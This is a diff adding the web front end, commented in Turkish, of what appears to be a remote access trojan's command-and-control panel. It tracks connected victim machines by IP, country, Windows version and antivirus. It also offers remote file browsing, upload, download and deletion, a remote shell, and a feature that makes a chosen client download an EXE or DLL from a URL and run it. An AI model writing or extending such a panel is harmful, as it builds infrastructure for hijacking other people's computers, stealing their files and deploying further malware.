+            if (['.exe','.msi','.bat','.cmd','.ps1','.sh','.py','.js','.go'].includes(ext))
+                return '<span class="fb-icon exe">⚙</span>';
+            if (['.txt','.log','.md','.json','.xml','.csv','.ini','.cfg','.conf'].includes(ext))
+                return '<span class="fb-icon txt">≡</span>';
+            if (['.pdf','.doc','.docx','.xls','.xlsx','.ppt','.pptx'].includes(ext))
+                return '<span class="fb-icon doc">□</span>';
+            return '<span class="fb-icon file">◻</span>';
+        }
+
+        function fbFmtSize(bytes) {
+            if (bytes === 0) return '0 B';
+            const k = 1024;
+            const sizes = ['B','KB','MB','GB'];
+            const i = Math.floor(Math.log(bytes) / Math.log(k));
+            return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
+        }
+
+        function _fbEsc(s) {
+            return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+        }
+
+        // ─── İndir ───────────────────────────────────────
+        async function fbDownload(path, name) {
+            fbSetStatus('info', `↓ İndiriliyor: ${name}...`);
+            try {
+                const res = await fetch('/api/fb/download', {
+                    method: 'POST', credentials: 'include',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ id: selectedID, path })
+                });
+                if (!res.ok) { fbSetStatus('error', 'İndirme hatası: ' + res.status); return; }
+                const data = await res.json();
+                if (data.error) { fbSetStatus('error', data.error); return; }
+                // Base64 → Blob → tıklama
+                const bytes = atob(data.data);
+                const arr   = new Uint8Array(bytes.length);
+                for (let i = 0; i < bytes.length; i++) arr[i] = bytes.charCodeAt(i);
+                const blob  = new Blob([arr]);
+                const url   = URL.createObjectURL(blob);
+                const a     = document.createElement('a');
+                a.href = url; a.download = data.name || name;
+                document.body.appendChild(a); a.click();
+                setTimeout(() => { document.body.removeChild(a); URL.revokeObjectURL(url); }, 1000);
+                fbSetStatus('success', `✓ İndirildi: ${data.name} (${fbFmtSize(data.size)})`);
+            } catch(e) { fbSetStatus('error', 'Bağlantı hatası'); }
+        }
+
+        // ─── Sil ─────────────────────────────────────────
+        async function fbDelete(path) {
+            try {
+                const res = await fetch('/api/fb/delete', {
+                    method: 'POST', credentials: 'include',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ id: selectedID, path })
+                });
+                if (!res.ok) { fbSetStatus('error', 'Silme hatası: ' + res.status); return; }
+                const data = await res.json();
+                if (data.error) { fbSetStatus('error', data.error); return; }
+                fbSetStatus('success', `✓ Silindi: ${path.split(/[/\\]/).pop()}`);
+                fbRefresh();
+            } catch(e) { fbSetStatus('error', 'Bağlantı hatası'); }
+        }
+
+        // ─── Yeni Klasör ─────────────────────────────────
+        async function fbMkdirPrompt() {
+            const name = prompt('Yeni klasör adı:');
+            if (!name || !name.trim()) return;
+            const full = fbBuildPath(name.trim());
+            try {
+                const res = await fetch('/api/fb/mkdir', {
+                    method: 'POST', credentials: 'include',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ id: selectedID, path: full })
+                });
+                const data = await res.json();
+                if (data.error) { fbSetStatus('error', data.error); return; }
+                fbSetStatus('success', `✓ Klasör oluşturuldu: ${name}`);
+                fbRefresh();
+            } catch(e) { fbSetStatus('error', 'Bağlantı hatası'); }
+        }
+
+        // ─── Yükle ───────────────────────────────────────
+        async function fbUploadFiles(input) {
+            const files = Array.from(input.files);
+            if (!files.length) return;
+            fbSetStatus('info', `↑ ${files.length} dosya yükleniyor...`);
+            let ok = 0, fail = 0;
+            for (const file of files) {
+                const targetPath = fbBuildPath(file.name);
+                const reader = new FileReader();
+                const b64 = await new Promise((res, rej) => {
+                    reader.onload  = e => res(e.target.result.split(',')[1]);
+                    reader.onerror = rej;
+                    reader.readAsDataURL(file);
+                });
+                try {
+                    const r = await fetch('/api/fb/upload', {
+                        method: 'POST', credentials: 'include',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ id: selectedID, path: targetPath, data: b64 })
+                    });
+                    const d = await r.json();
+                    if (d.error) fail++; else ok++;
+                } catch(e) { fail++; }
+            }
+            input.value = '';
+            fbSetStatus(fail ? 'error' : 'success',
+                `✓ ${ok} yüklendi${fail ? `, ✗ ${fail} başarısız` : ''}`);
+            fbRefresh();
+        }
+
+        // ─── Yeniden Adlandır ────────────────────────────
+        async function fbRename(oldPath, oldName) {
+            const newName = prompt('Yeni ad:', oldName);
+            if (!newName || !newName.trim() || newName.trim() === oldName) return;
+            const trimmedName = newName.trim();
+            // Separator'ı (\ veya /) doğru bul
+            const sepIdx  = Math.max(oldPath.lastIndexOf('\\'), oldPath.lastIndexOf('/'));
+            const dir     = sepIdx >= 0 ? oldPath.substring(0, sepIdx + 1) : '';
+            const newPath = dir + trimmedName;
+            try {
+                const res = await fetch('/api/fb/rename', {
+                    method: 'POST', credentials: 'include',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ id: selectedID, old: oldPath, new: newPath })
+                });
+                const data = await res.json();
+                if (data.error) { fbSetStatus('error', data.error); return; }
+                fbSetStatus('success', `✓ Yeniden adlandırıldı: ${newName}`);
+                fbRefresh();
+            } catch(e) { fbSetStatus('error', 'Bağlantı hatası'); }
+        }
+
+        // ─── Context Menu ────────────────────────────────
+        function fbShowCtx(e, name, type, fullPath) {
+            e.preventDefault();
+            fbCtxTarget = { name, type, fullPath };
+            const menu = document.getElementById('fb-ctx-menu');
+            menu.style.display = 'block';
+            let x = e.clientX, y = e.clientY;
+            const mw = 160, mh = 130;
+            if (x + mw > window.innerWidth)  x = window.innerWidth  - mw - 8;
+            if (y + mh > window.innerHeight) y = window.innerHeight - mh - 8;
+            menu.style.left = x + 'px';
+            menu.style.top  = y + 'px';
+        }
+
+        function fbHideCtx() {
+            document.getElementById('fb-ctx-menu').style.display = 'none';
+        }
+
+        function fbCtxOpen() {
+            fbHideCtx();
+            if (!fbCtxTarget) return;
+            const { type, fullPath } = fbCtxTarget;
+            if (type === 'dir' || type === 'drive') fbNavigate(fullPath);
+            else fbDownload(fullPath, fbCtxTarget.name);
+        }
+
+        function fbCtxDownload() {
+            fbHideCtx();
+            if (!fbCtxTarget) return;
+            fbDownload(fbCtxTarget.fullPath, fbCtxTarget.name);
+        }
+
+        function fbCtxRename() {
+            fbHideCtx();
+            if (!fbCtxTarget) return;
+            fbRename(fbCtxTarget.fullPath, fbCtxTarget.name);
+        }
+
+        function fbCtxDelete() {
+            fbHideCtx();
+            if (!fbCtxTarget) return;
+            const { name, fullPath } = fbCtxTarget;
+            if (!confirm(`"${name}" silinsin mi? Bu işlem geri alınamaz.`)) return;
+            fbDelete(fullPath);
+        }
+
+        function fbSetStatus(type, msg) {
+            const bar = document.getElementById('fb-statusbar');
+            bar.textContent  = msg;
+            bar.className = 'fb-statusbar' + (type ? ' status-' + type : '');
+        }
+
+        // ─── Keyboard ────────────────────────────────────
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') {
+                const active = document.activeElement;
+                if (active && active.id === 'shell-input') sendShellCommand();
+                else if (active && active.id === 'mobile-shell-input') sendMobileShellCommand();
+                else if (active && active.id === 'msg-input') sendMessage();
+            }
+            if (e.key === 'Escape') {
+                document.getElementById('shell-menu').classList.remove('open');
+                document.getElementById('browse-menu').classList.remove('open');
+                closeSidebar();
+            }
+        });
+
+        document.addEventListener('click', (e) => {
+            if (!e.target.closest('.tab-dropdown')) {
+                document.getElementById('shell-menu').classList.remove('open');
+                document.getElementById('browse-menu').classList.remove('open');
+            }
+        });
+
+        // ─── Client Listesi Güncelle ─────────────────────
+        async function refreshClients() {
+            try {
+                const res = await fetch('/api/clients', { credentials: 'include' });
+                if (!res.ok) return;
+                const clients = await res.json();
+                const count = clients ? clients.length : 0;
+
+                document.getElementById('count').textContent    = count;
+                document.getElementById('nav-badge').textContent = count;
+                document.getElementById('stat-clients').textContent = count;
+
+                // Home mini liste
+                const homeList = document.getElementById('home-client-list');
+                if (!clients || clients.length === 0) {
+                    homeList.innerHTML = '<div class="empty-mini">Henüz bağlı client yok.</div>';
+                } else {
+                    homeList.innerHTML = clients.slice(0, 5).map(c => `
+                        <div class="home-client-row">
+                            <span class="dot"></span>
+                            <span class="ip">${c.IP}</span>
+                            <span class="client-id">#${c.ID}</span>
+                            <span class="time">${c.ConnectedAt}</span>
+                        </div>
+                    `).join('');
+                }
+
+                // Clients listesi
+                const list = document.getElementById('client-list');
+                if (!clients || clients.length === 0) {
+                    list.innerHTML = '<div class="empty">Henüz bağlı client yok.</div>';
+                    if (selectedID) closeDetail();
+                    return;
+                }
+                const ids = clients.map(c => c.ID);
+                if (selectedID && !ids.includes(selectedID)) closeDetail();
+
+                list.innerHTML = clients.map(c => {
+                    const q = s => (s||'').replace(/&/g,'&amp;').replace(/'/g,'&#39;').replace(/"/g,'&quot;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+                    return `<div class="client-row ${selectedID === c.ID ? 'active' : ''}"
+                         data-id="${q(c.ID)}" data-ip="${q(c.IP)}" data-time="${q(c.ConnectedAt)}"
+                         data-win="${q(c.WinVersion)}" data-desktop="${q(c.DesktopName)}"
+                         data-av="${q(c.AntiVirus)}" data-country="${q(c.Country)}"
+                         onclick="selectFromData(this)">
+                        <span class="dot"></span>
+                        <div class="client-info">
+                            <div class="client-top">
+                                <span class="ip">${q(c.IP)}</span>
+                                ${c.Country ? `<span class="country-badge">${q(c.Country)}</span>` : ''}
+                            </div>
+                            ${c.WinVersion ? `<span class="win-version">${q(c.WinVersion)}</span>` : ''}
+                            <span class="meta">
+                                <span class="client-id">#${q(c.ID)}</span>
+                                ${c.DesktopName ? `<span class="desktop-name">${q(c.DesktopName)}</span>` : ''}
+                                <span class="time">${q(c.ConnectedAt)}</span>
+                            </span>
+                        </div>
+                        <span class="arrow">›</span>
+                    </div>`;
+                }).join('');
+            } catch (e) {}
+        }
+
+        window.addEventListener('resize', () => {
+            if (window.innerWidth > 768) {
+                document.getElementById('client-panel').style.display = 'flex';
+                document.getElementById('detail-panel').style.display = 'flex';
+                document.getElementById('back-btn').style.display = 'none';
+                document.getElementById('mobile-keyboard').style.display = 'none';
+                closeSidebar();
+            } else {
+                updateMobileKeyboard();
+            }
+        });
+
+        // ─── Terminal Resize ─────────────────────────────
+        (function() {
+            let isResizing = false;
+            let startY = 0;
+            let startH = 0;
+
+            function getHandle() { return document.getElementById('terminal-resize-handle'); }
+            function getOutput() { return document.getElementById('terminal-output'); }
+
+            function onStart(e) {
+                isResizing = true;
+                startY = e.touches ? e.touches[0].clientY : e.clientY;
+                startH = getOutput().offsetHeight;
+                document.body.style.userSelect = 'none';
+                e.preventDefault();
+            }
+
+            function onMove(e) {
+                if (!isResizing) return;
+                const y = e.touches ? e.touches[0].clientY : e.clientY;
+                const delta = y - startY;
+                const newH = Math.max(80, Math.min(startH + delta, window.innerHeight * 0.75));
+                getOutput().style.height = newH + 'px';
+                getOutput().style.flex = 'none';
+            }
+
+            function onEnd() {
+                isResizing = false;
+                document.body.style.userSelect = '';
+            }
+
+            document.addEventListener('mouseup', onEnd);
+            document.addEventListener('touchend', onEnd);
+            document.addEventListener('mousemove', onMove);
+            document.addEventListener('touchmove', onMove, { passive: false });
+
+            // Handle hazır olunca event ekle
+            function attachHandle() {
+                const h = getHandle();
+                if (!h) return;
+                h.addEventListener('mousedown', onStart);
+                h.addEventListener('touchstart', onStart, { passive: false });
+            }
+
+            // DOM hazır olana kadar bekle
+            if (document.readyState === 'loading') {
+                document.addEventListener('DOMContentLoaded', attachHandle);
+            } else {
+                attachHandle();
+            }
+        })();
+
+        // ─── Remote File Execution ───────────────────────
+        let rfeType = 'exe';
+
+        function rfeSetType(type) {
+            rfeType = type;
+            document.getElementById('rfe-btn-exe').classList.toggle('active', type === 'exe');
+            document.getElementById('rfe-btn-dll').classList.toggle('active', type === 'dll');
+            document.getElementById('rfe-args-row').style.display  = type === 'exe' ? 'flex' : 'none';
+            document.getElementById('rfe-dll-note').style.display  = type === 'dll' ? 'flex' : 'none';
+            document.getElementById('rfe-card-title').textContent  = type === 'exe' ? 'Execute EXE' : 'Execute DLL';
+            document.getElementById('rfe-url').placeholder = type === 'exe'
+                ? 'example.com/payload.exe'
+                : 'example.com/payload.dll';
+        }
+
+        function rfeSetStatus(type, msg) {
+            const sb = document.getElementById('rfe-statusbar');
+            sb.textContent = msg;
+            sb.className = 'rfe-statusbar';
+            if (type === 'ok')      sb.classList.add('rfe-sb-ok');
+            if (type === 'err')     sb.classList.add('rfe-sb-err');
+            if (type === 'loading') sb.classList.add('rfe-sb-loading');
+        }
+
+        async function rfeExecute() {
+            if (!selectedID) {
+                rfeShowResult(false, 'Önce bir client seçin.');
+                return;
+            }
+            const urlVal = document.getElementById('rfe-url').value.trim();
+            const args   = document.getElementById('rfe-args').value.trim();
+
+            // URL'e http:// prefix'ini ekle (eğer yoksa)
+            let url = urlVal;
+            if (url && !/^https?:\/\//i.test(url)) url = 'http://' + url;
+
+            if (!url) {
+                rfeShowResult(false, 'URL boş olamaz.');
+                return;
+            }
+
+            const btn  = document.getElementById('rfe-run-btn');
+            const text = document.getElementById('rfe-btn-text');
+            btn.disabled = true;
+            text.textContent = '⏳ Bekleniyor...';
+            rfeSetStatus('loading', 'Komut gönderiliyor...');
+            document.getElementById('rfe-result-card').style.display = 'none';
+
+            try {
+                const res = await fetch('/api/rfe', {
+                    method: 'POST', credentials: 'include',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ id: selectedID, url, type: rfeType, args })
+                });
+                if (res.status === 504) {
+                    rfeShowResult(false, 'Timeout: client 30 saniye içinde cevap vermedi.');
+                } else if (!res.ok) {
+                    const txt = await res.text();
+                    rfeShowResult(false, 'Sunucu hatası: ' + txt);
+                } else {
+                    const data = await res.json();
+                    rfeShowResult(data.success, data.message || (data.success ? 'Başarıyla çalıştırıldı.' : 'Çalıştırılamadı.'));
+                }
+            } catch (e) {
+                rfeShowResult(false, 'Bağlantı hatası: ' + e.message);
+            } finally {
+                btn.disabled = false;
+                text.textContent = '▶ Çalıştır';
+            }
+        }
+
+        function rfeShowResult(success, message) {
+            const card = document.getElementById('rfe-result-card');
+            const body = document.getElementById('rfe-result-body');
+            const icon = document.getElementById('rfe-result-icon');
+            const text = document.getElementById('rfe-result-text');
+            card.style.display = 'block';
+            body.className = 'rfe-result-body ' + (success ? 'rfe-ok' : 'rfe-err');
+            icon.textContent = success ? '✓' : '✕';
+            text.textContent = message;
+            rfeSetStatus(success ? 'ok' : 'err', success ? 'Başarılı' : 'Hata');
+        }
+
+        function rfeClear() {
+            document.getElementById('rfe-result-card').style.display = 'none';
+            document.getElementById('rfe-url').value  = '';
+            document.getElementById('rfe-args').value = '';
+            rfeSetStatus('', 'Hazır');
+        }
+
+        // ─── Init ────────────────────────────────────────
+        startStatsPolling();
+        setInterval(refreshClients, 3000);
+        refreshClients();
+
+        // ─── File Browser Event Delegation ───────────────
+        // (DOM hazır, script body sonunda çalışıyor)
+        ;(function() {
+            const tbody = document.getElementById('fb-tbody');
+
+            // tbody: çift tık → aç/indir
+            tbody.addEventListener('dblclick', e => {
+                const row = e.target.closest('tr.fb-row');
+                if (!row) return;
+                if (row.dataset.type === 'dir' || row.dataset.type === 'drive')
+                    fbNavigate(row.dataset.path);
+                else
+                    fbDownload(row.dataset.path, row.dataset.name);
+            });
+
+            // tbody: act buton tıklama
+            tbody.addEventListener('click', e => {
+                const btn = e.target.closest('.fb-act-btn');
+                if (!btn) return;
+                const row = btn.closest('tr.fb-row');
+                if (!row) return;
+                if (btn.classList.contains('fb-act-open')) fbNavigate(row.dataset.path);
+                else fbDownload(row.dataset.path, row.dataset.name);
+            });
+
+            // tbody: sağ tık → context menu
+            tbody.addEventListener('contextmenu', e => {
+                const row = e.target.closest('tr.fb-row');
+                if (!row) return;
+                e.preventDefault();
+                e.stopPropagation();
+                fbCtxTarget = {
+                    name:     row.dataset.name,
+                    type:     row.dataset.type,
+                    fullPath: row.dataset.path,
+                };
+                const isDir = row.dataset.type === 'dir' || row.dataset.type === 'drive';
+                // Klasör → "Aç/Gir" göster, "İndir" gizle
+                // Dosya  → "Aç/Gir" gizle, "İndir" göster
+                document.getElementById('fb-ctx-btn-open').style.display     = isDir ? '' : 'none';
+                document.getElementById('fb-ctx-btn-download').style.display = isDir ? 'none' : '';
+                const menu = document.getElementById('fb-ctx-menu');
+                menu.style.display = 'block';
+                let x = e.clientX, y = e.clientY;
+                if (x + 168 > window.innerWidth)  x = window.innerWidth  - 172;
+                if (y + 148 > window.innerHeight) y = window.innerHeight - 152;
+                menu.style.left = x + 'px';
+                menu.style.top  = y + 'px';
+            });
+
+            // Breadcrumb: tıklama
+            document.getElementById('fb-breadcrumb').addEventListener('click', e => {
+                const item = e.target.closest('.fb-bc-nav');
+                if (!item) return;
+                fbNavigate(item.dataset.bcpath);
+            });
+
+            // Herhangi bir yere tıkla → ctx menu kapat
+            document.addEventListener('click', () => fbHideCtx());
+            document.addEventListener('contextmenu', e => {
+                if (!e.target.closest('tr.fb-row')) fbHideCtx();
+            });
+        })();
+    </script>
+</body>
+</html>
